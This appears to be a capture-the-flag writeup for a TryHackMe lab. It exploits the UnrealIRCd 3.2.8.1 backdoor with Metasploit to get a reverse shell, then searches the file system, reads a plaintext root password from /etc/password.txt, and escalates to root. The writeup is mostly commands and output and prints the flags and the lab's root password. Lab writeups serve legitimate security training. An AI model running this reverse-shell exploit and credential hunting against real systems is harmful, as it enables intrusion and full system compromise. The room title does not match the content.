# Upload Vulnerabilities — CTF Writeup

> **Target:*10.48.191.132* UnrealIRCd backdoor exploitation via Metasploit, leading to full root access.**

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Step 1 — Ping Scan](#step-1--ping-scan)
- [Step 2 — Nmap Scan](#step-2--nmap-scan)
- [Step 3 — Metasploit: Search & Load Module](#step-3--metasploit-search--load-module)
- [Step 4 — Configure Exploit Options](#step-4--configure-exploit-options)
- [Step 5 — Run the Exploit & Get Shell](#step-5--run-the-exploit--get-shell)
- [Step 6 — 1st Flag (webmaster)](#step-6--1st-flag-webmaster)
- [Step 7 — Search for Password Files](#step-7--search-for-password-files)
- [Step 8 — Read password.txt](#step-8--read-passwordtxt)
- [Step 9 — Switch to Root](#step-9--switch-to-root)
- [Step 10 — Final Flag (root)](#step-10--final-flag-root)
- [Flags Summary](#flags-summary)
- [Key Takeaways](#key-takeaways)

---

## Challenge Overview

| Field       | Details                                      |
|-------------|----------------------------------------------|
| Name        | Upload Vulnerabilities                       |
| Platform    | TryHackMe                                    |
| Difficulty  | Easy                                         |
| Category    | Exploitation / Privilege Escalation          |
| Target IP   | 10.48.191.132                                |
| Exploit     | UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075) |
| Objective   | Find 2 flags (user + root)                   |

---

## Step 1 — Ping Scan

Verified that the target machine was live and reachable before scanning.

**Command:**
```bash
ping -c 4 10.48.191.132
```

**Output:**
```
PING 10.48.191.132 (10.48.191.132) 56(84) bytes of data.
64 bytes from 10.48.191.132: icmp_seq=1 ttl=64 time=0.782 ms
64 bytes from 10.48.191.132: icmp_seq=2 ttl=64 time=0.360 ms
64 bytes from 10.48.191.132: icmp_seq=3 ttl=64 time=0.349 ms
64 bytes from 10.48.191.132: icmp_seq=4 ttl=64 time=0.391 ms

--- 10.48.191.132 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3035ms
rtt min/avg/max/mdev = 0.349/0.470/0.782/0.180 ms
```

> ✅ Host is up — 0% packet loss confirmed. Proceeding with port scanning.

---

## Step 2 — Nmap Scan

Ran a full port scan with service version detection to identify what's running on the target.

**Command:**
```bash
nmap -sV -p- -T4 10.48.191.132
```

**Scan Results:**

| Port      | State | Service | Version                                        |
|-----------|-------|---------|------------------------------------------------|
| 22/tcp    | open  | ssh     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.5              |
| 6667/tcp  | open  | irc     | UnrealIRCd                                     |

**Additional Info:**
```
Service Info: Host: irc.pentest-target.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Key Finding:** Port **6667** is running **UnrealIRCd** — a version known for a critical backdoor vulnerability (CVE-2010-2075).

---

## Step 3 — Metasploit: Search & Load Module

Launched Metasploit and searched for a suitable exploit for UnrealIRCd.

**Commands:**
```bash
msfconsole
search unrealircd
use 0
```

**Search Results:**

| # | Module Name                                  | Disclosure Date | Rank      | Description                              |
|---|----------------------------------------------|-----------------|-----------|------------------------------------------|
| 0 | exploit/unix/irc/unreal_ircd_3281_backdoor   | 2010-06-12      | excellent | UnrealIRCd 3.2.8.1 Backdoor Command Exec |

> The module ranked **excellent** — a reliable and well-known exploit for this backdoor.

**Load the module:**
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

---

## Step 4 — Configure Exploit Options

Set all the required options — target host, attacker IP, and payload type.

**Commands:**
```bash
set rhosts 10.48.191.132
set payload cmd/unix/reverse
set lhost 10.48.101.134
```

**Configured Options:**

| Option   | Value           |
|----------|-----------------|
| RHOSTS   | 10.48.191.132   |
| LHOST    | 10.48.101.134   |
| PAYLOAD  | cmd/unix/reverse |

> Note: Initial `run` failed with `Msf::OptionValidateError` because LHOST was not set — fixed by explicitly setting it.

---

## Step 5 — Run the Exploit & Get Shell

Executed the exploit. Metasploit connected to the IRC service, triggered the backdoor, and opened a reverse shell.

**Command:**
```bash
run
```

**Output:**
```
[*] Started reverse TCP double handler on 10.48.101.134:4444
[*] 10.48.191.132:6667 - Running automatic check
[+] 10.48.191.132:6667 - The target appears to be vulnerable. UnrealIRCd detected after registration
[*] 10.48.191.132:6667 - Sending IRC backdoor command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 1 opened (10.48.101.134:4444 -> 10.48.191.132:42126)
```

> ✅ **Shell obtained!** We now have remote command execution on the target as `webmaster`.

---

## Step 6 — 1st Flag (webmaster)

With the shell active, navigated to the home directory and found the first flag inside the `webmaster` user's folder.

**Commands:**
```bash
ls /home
cd webmaster
ls
cat flag.txt
```

**Output:**
```
THM{Pwned-Y0ur-First-Machine}
```

> 🚩 **Flag 1:** `THM{Pwned-Y0ur-First-Machine}`

---

## Step 7 — Search for Password Files

After getting the first flag, searched the entire file system for any files containing "password" in their name to find a path to root.

**Command:**
```bash
find / -name password* 2>/dev/null
```

**Notable Results:**
```
/boot/grub/i386-pc/password.mod
/boot/grub/i386-pc/password_pbkdf2.mod
/snap/core20/2379/var/lib/pam/password
/snap/core/17272/usr/lib/pppd/2.4.7/passwordfd.so
/etc/password.txt          ← Interesting!
/var/lib/pam/password
/var/cache/debconf/passwords.dat
```

> 🔍 **Interesting find:** `/etc/password.txt` — a non-standard file that likely contains credentials.

---

## Step 8 — Read password.txt

Read the contents of the suspicious `password.txt` file found in `/etc/`.

**Command:**
```bash
cat etc/password.txt
```

**Output:**
```
root:PDLrCVl1pLD91U0JMmCz
```

> 🔑 **Root password found:** `PDLrCVl1pLD91U0JMmCz`

---

## Step 9 — Switch to Root

Used the discovered password to switch to the root user via `su`.

**Commands:**
```bash
su
Password: PDLrCVl1pLD91U0JMmCz
whoami
```

**Output:**
```
root
```

> ✅ **Root access achieved!** Full system compromise confirmed.

---

## Step 10 — Final Flag (root)

Navigated to the `/root` directory and read the final flag file.

**Commands:**
```bash
cd root
ls
cat flag.txt
```

**Output:**
```
THM{Escalat1on-D0ne}
```

> 🚩 **Flag 2 (Root):** `THM{Escalat1on-D0ne}`

---

## Flags Summary

| # | Flag                              | Location                    | User       |
|---|-----------------------------------|-----------------------------|------------|
| 1 | `THM{Pwned-Y0ur-First-Machine}`   | `/home/webmaster/flag.txt`  | webmaster  |
| 2 | `THM{Escalat1on-D0ne}`            | `/root/flag.txt`            | root       |

---

## Attack Chain

```
Ping Scan → Nmap → UnrealIRCd on port 6667 → Metasploit Exploit
→ Shell as webmaster → Flag 1 → find password* → /etc/password.txt
→ su root with password → Flag 2
```

---

## Key Takeaways

- **Nmap service version scanning** (`-sV`) is essential — it revealed UnrealIRCd which led directly to the exploit
- **UnrealIRCd 3.2.8.1** contains a known backdoor (CVE-2010-2075) with a Metasploit module rated *excellent*
- Always remember to **set LHOST** when using reverse payloads in Metasploit
- **Plaintext password files** stored in non-standard locations (`/etc/password.txt`) are a critical misconfiguration
- `find / -name password* 2>/dev/null` is a simple but effective post-exploitation recon command for finding credential files

---

*Writeup by: [showrya] | Platform: TryHackMe | Room: Upload Vulnerabilities*
